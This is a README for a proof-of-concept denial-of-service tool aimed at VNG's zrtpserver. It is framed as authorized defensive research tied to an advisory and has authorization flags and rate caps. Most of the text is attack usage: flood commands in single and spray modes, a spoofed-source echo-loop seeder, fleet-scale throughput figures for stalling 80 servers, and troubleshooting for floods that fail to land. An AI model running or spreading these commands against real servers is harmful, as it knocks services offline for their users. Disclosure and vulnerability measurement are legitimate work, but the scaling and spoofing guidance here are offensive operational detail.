# zudp-poc — ZUDP-2026-001 PoC harness

Authorized **defensive** research PoC for the short-datagram `sleep()` availability
DoS in VNG `zrtpserver` (advisory: [`ZUDP-2026-001-sleep-dos.md`](ZUDP-2026-001-sleep-dos.md),
spoof guide: [`ZUDP-2026-001-udp-spoof-poc-impl.md`](ZUDP-2026-001-udp-spoof-poc-impl.md)).

> ⚠️ **Run ONLY against hosts you own or have written authorization to test.**
> Every sending path is gated behind `--i-have-authorization` plus hard `--max-pps`
> / `--max-secs` kill-switch ceilings (advisory §12). Source-IP spoofing (`loop-seed`)
> is isolated-lab-only.

## What it does

Produces the advisory's **dose–response curve** (attacker pps vs. legitimate-flow
degradation) plus a fleet cost model:

| Subcommand | Role (advisory ref) |
|---|---|
| `attack`    | attacker-flood: 1–4 byte datagrams, `single`/`spray` reuseport modes (§8.3, §8.4) |
| `probe`     | victim-probe: paced valid-length sender measuring RTT (hdrhistogram) + loss (§8.5) |
| `harness`   | ramp + baseline + per-step probe + recovery, emits CSV/JSON, derives `T_degrade`/`T_stall` (§9) |
| `cost`      | §10 cost model / fleet extrapolation from measured `r_thread` / `r_deg` |
| `diag`      | reachability + vulnerable-branch check via the 3× reflection primitive |
| `loop-seed` | spoofed echo-loop seed — **Linux + `--features spoof` + CAP_NET_RAW only** (§3.3) |

## Build

This project builds with a standard Rust toolchain. **On this machine specifically**
the MSVC toolchain could not link (the Windows SDK is not installed — no `kernel32.lib`),
so the **GNU toolchain** is used (it bundles its own self-contained linker):

```powershell
# one-time
rustup toolchain install stable-x86_64-pc-windows-gnu
rustup default stable-x86_64-pc-windows-gnu

# corporate TLS breaks cargo's cert-revocation check → disable it for fetches
$env:CARGO_HTTP_CHECK_REVOKE = "false"
cargo build --release
```

Binary: `target/release/zudp-poc.exe`.

> The default clap `color` feature and `ctrlc` were dropped because they pull in
> `windows-sys`, which needs `dlltool.exe` (absent from the bundled GNU toolchain).
> The kill switch is therefore the enforced `--secs` / `--max-secs` duration cap
> (not Ctrl-C).

On a machine with the MSVC build tools + Windows SDK installed, the default
`x86_64-pc-windows-msvc` toolchain also works with no changes.

### Linux (recommended for real runs)

On Linux the `attack` path automatically uses a **`sendmmsg` batch fast path** (up to
1024 datagrams per syscall) with an enlarged `SO_SNDBUF`, lifting per-core throughput by
1–2 orders of magnitude over the portable one-`send_to`-per-packet path used on Windows.
This needs no special privilege:

```bash
cargo build --release            # sendmmsg fast path is compiled in on Linux
# raise the kernel cap so SO_SNDBUF actually grows (optional, helps at high rates):
sudo sysctl -w net.core.wmem_max=16777216
```

For the spoofing / echo-loop variant additionally:

```bash
cargo build --release --features spoof
sudo setcap cap_net_raw+ep ./target/release/zudp-poc   # grant raw-socket cap
```

> **Throughput note.** The Windows loopback figure (~124k pps at `--pps 0`) is limited by
> the per-packet syscall path + ENOBUFS backoff + loopback, and is *not* representative.
> ~124k pps already exceeds what one 40-thread server needs (~13.3k pps to stall). For
> fleet-scale rates (~1.07M pps for 80 servers) use the Linux `sendmmsg` build and/or
> multiple sending hosts.

## Usage examples

```bash
# Fleet cost model from measured thresholds (defaults use advisory reference values)
zudp-poc cost --r-thread 333 --r-deg 100 --cores 40 --servers 80

# Per-thread threshold (one reuseport bucket): fixed source port
zudp-poc attack --target SERVER_IP:4200 --pps 300 --secs 30 --mode single \
    --i-have-authorization

# Whole-server: spray across a 256-port pool to cover all buckets
zudp-poc attack --target SERVER_IP:4200 --pps 15000 --secs 30 --mode spray \
    --i-have-authorization

# Legitimate-client sensor
zudp-poc probe --target SERVER_IP:4200 --pps 50 --payload-len 172 --secs 30 \
    --i-have-authorization

# Full dose–response ramp -> CSV on stdout + JSON report file
zudp-poc harness --target SERVER_IP:4200 --steps 0,25,50,100,200,400,800 \
    --dwell-secs 30 --recovery-secs 30 --mode single \
    --out report.json --i-have-authorization

# Echo-loop seed (Linux + --features spoof only): seed once, then STOP; verify with tcpdump
sudo ./zudp-poc loop-seed --mode self --a 10.0.0.5 --port 4200 --seeds 1 \
    --i-have-authorization
```

## Diagnosing a flood that "does nothing"

Run `diag` first — it sends a low rate of 3-byte packets and counts reflections:

```bash
zudp-poc diag --target SERVER_IP:4200 --i-have-authorization
```

- `reflection_ratio ~= 3.0` → packets reach `:PORT` and the vulnerable branch is present.
  If a flood still seems ineffective, it is a **scale/placement** problem: use `--mode spray`
  (a single fixed source lands on one of ~40 threads, so `single` only stalls 1/40 of the
  server and it keeps serving), and check the achieved pps the tool reports.
- `reflection_ratio ~= 0` → **return** packets are being dropped. On **Windows** this is
  almost always the local host firewall (**Windows Defender**) or corporate policy eating the
  inbound UDP — **not** the server. Importantly, the DoS still lands regardless of whether
  echoes come back (the server thread sleeps either way); you just can't *measure* it from
  that host. Re-run `diag`/`probe` from a **Linux** host, and confirm the path with `tcpdump`
  on the server. Only if a server-side capture shows nothing arriving is the branch truly
  unreachable/patched.

## Local smoke test

A trivial loopback UDP echo (no `sleep` bug) exercises the harness mechanics:

```powershell
$u = [System.Net.Sockets.UdpClient]::new(4200)
$ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any,0)
while ($true) { $d = $u.Receive([ref]$ep); [void]$u.Send($d,$d.Length,$ep) }
```

Then run `harness` / `probe` against `127.0.0.1:4200`. On loopback the curve stays
flat (no vulnerable branch); the point is to confirm CSV/JSON output, pacing, and
RTT/loss measurement before pointing at an authorized target.

## Safety (advisory §12 / spoof guide §7)

- `--i-have-authorization` required before any packet is sent.
- `--max-pps` (default 2,000,000) and `--max-secs` (default 300) hard ceilings.
- Payload length is validated: attack ∈ `1..=4`, probe `> 4`.
- `loop-seed` additionally requires the Linux build, the `spoof` feature, and CAP_NET_RAW,
  and prints the `tcpdump` verification + `iptables` loop-break commands.
